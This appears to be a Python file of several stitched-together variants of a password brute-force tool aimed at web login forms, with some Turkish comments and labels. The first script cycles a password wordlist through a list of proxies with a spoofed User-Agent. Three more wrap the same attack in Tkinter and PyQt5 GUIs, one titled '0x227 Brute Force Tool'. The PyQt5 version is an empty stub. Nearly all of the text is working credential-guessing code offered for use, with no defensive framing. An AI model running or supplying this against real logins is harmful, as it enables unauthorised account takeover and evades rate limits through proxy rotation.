import requests
import time
url = input("Enter the target URL: ")
username = input("Enter the target username: ")
password_file = input("Enter the full path of the password file: ")
proxy_file = input("Enter the full path of the proxy file: ")

# Read the list of proxy servers from file
with open(proxy_file, 'r') as file:
    proxies = file.readlines()
    proxies = [proxy.strip() for proxy in proxies]

# A Session object allows us to persist certain parameters across requests
session = requests.Session()
with open(password_file, 'r') as file:
    passwords = file.readlines()
    for password in passwords:
        password = password.strip()
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
        }
        
        data = {
            'username': username,
            'password': password
        }
        
        for proxy in proxies:
            try:
                response = session.post(url, headers=headers, data=data, proxies={'http': proxy, 'https': proxy})
                
                if response.status_code == 200 and "Login successful" in response.text:
                    print("Password found: " + password)
                    break
            except:
                continue
                
            time.sleep(2)  # 2 saniyelik bir gecikme eklendi
import tkinter as tk
import threading
import requests
class BruteForceApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Brute Force App")
        self.master.geometry("400x300")
        
        # URL Label and Entry
        self.url_label = tk.Label(self.master, text="Enter the target URL:")
        self.url_label.pack()
        self.url_entry = tk.Entry(self.master)
        self.url_entry.pack()
        
        # Username Label and Entry
        self.username_label = tk.Label(self.master, text="Enter the target username:")
        self.username_label.pack()
        self.username_entry = tk.Entry(self.master)
        self.username_entry.pack()
        
        # Password List Label and Entry
        self.password_list_label = tk.Label(self.master, text="Enter the password file name:")
        self.password_list_label.pack()
        self.password_list_entry = tk.Entry(self.master)
        self.password_list_entry.pack()
        
        # Output Label
        self.output_label = tk.Label(self.master, text="")
        self.output_label.pack()
        
        # Start Button
        self.start_button = tk.Button(self.master, text="Start Brute Force", command=self.start_brute_force)
        self.start_button.pack()
        
        # Stop Button
        self.stop_button = tk.Button(self.master, text="Stop Brute Force", command=self.stop_brute_force)
        self.stop_button.pack()
        
        self.running = False
    
    def start_brute_force(self):
        if not self.running:
            self.running = True
            url = self.url_entry.get()
            username = self.username_entry.get()
            password_file = self.password_list_entry.get()
            
            self.output_label.config(text="Brute force in progress...")
            
            t = threading.Thread(target=self.brute_force, args=(url, username, password_file))
            t.start()
    
    def stop_brute_force(self):
        self.running = False
    
    def brute_force(self, url, username, password_file):
        with open(password_file, 'r') as file:
            passwords = file.readlines()
            for password in passwords:
                password = password.strip()
                if not self.running:
                    self.output_label.config(text="Brute force stopped.")
                    break
                try:
                    response = requests.post(url, data={'username': username, 'password': password})
                    if "Login successful" in response.text:
                        self.output_label.config(text="Password found: " + password)
                        self.running = False
                        break
                except requests.exceptions.RequestException:
                    pass
            else:
                self.output_label.config(text="Password not found.")
                self.running = False
if __name__ == "__main__":
    root = tk.Tk()
    app = BruteForceApp(root)
    root.mainloop()
import sys
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QPushButton

class BruteForceApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.setWindowTitle('Brute Force App')
        self.setGeometry(100, 100, 400, 300)

        # Kullanıcı adı giriş kutusu
        self.username_label = QLabel('Kullanıcı Adı:', self)
        self.username_label.move(50, 50)
        self.username_input = QLineEdit(self)
        self.username_input.move(150, 50)
        self.username_input.resize(200, 20)

        # Şifre dosyası adı giriş kutusu
        self.password_label = QLabel('Şifre Dosyası:', self)
        self.password_label.move(50, 100)
        self.password_input = QLineEdit(self)
        self.password_input.move(150, 100)
        self.password_input.resize(200, 20)

        # Hedef URL giriş kutusu
        self.url_label = QLabel('Hedef URL:', self)
        self.url_label.move(50, 150)
        self.url_input = QLineEdit(self)
        self.url_input.move(150, 150)
        self.url_input.resize(200, 20)

        # Çalıştır düğmesi
        self.run_button = QPushButton('Çalıştır', self)
        self.run_button.move(150, 200)
        self.run_button.resize(100, 30)
        self.run_button.clicked.connect(self.run_script)

        self.show()

    def run_script(self):
        username = self.username_input.text()
        password_file = self.password_input.text()
        url = self.url_input.text()

        # Burada script dosyasını çalıştırabilirsiniz
if __name__ == '__main__':
    app = QApplication(sys.argv)
    brute_force_app = BruteForceApp()
    sys.exit(app.exec_())

from tkinter import *
from tkinter import messagebox
import threading
import requests

root = Tk()
root.title("0x227 Brute Force Tool")
root.geometry("500x300")
root.configure(bg="#2c2f33")

url_label = Label(root, text="Target URL:", font=("Arial", 14), fg="white", bg="#2c2f33")
url_label.grid(row=0, column=0, padx=10, pady=10)
url_entry = Entry(root, width=40)
url_entry.grid(row=0, column=1, padx=10, pady=10)

username_label = Label(root, text="Target Username:", font=("Arial", 14), fg="white", bg="#2c2f33")
username_label.grid(row=1, column=0, padx=10, pady=10)
username_entry = Entry(root, width=40)
username_entry.grid(row=1, column=1, padx=10, pady=10)

password_label = Label(root, text="Password File Name:", font=("Arial", 14), fg="white", bg="#2c2f33")
password_label.grid(row=2, column=0, padx=10, pady=10)
password_entry = Entry(root, width=40)
password_entry.grid(row=2, column=1, padx=10, pady=10)

def brute_force():
    url = url_entry.get()
    username = username_entry.get()
    password_file = password_entry.get()
    with open(password_file, 'r') as file:
        passwords = file.readlines()
        for password in passwords:
            password = password.strip()
            response = requests.post(url, data={'username': username, 'password': password})
            if "Login successful" in response.text:
                messagebox.showinfo("Success", "Password found: " + password)
                break
        else:
            messagebox.showinfo("Failure", "Password not found")

def start_brute_force():
    thread = threading.Thread(target=brute_force)
    thread.start()

start_button = Button(root, text="Start Brute Force", command=start_brute_force, font=("Arial", 14), bg="#7289da", fg="white")
start_button.grid(row=3, column=0, columnspan=2, padx=10, pady=10)

root.mainloop()
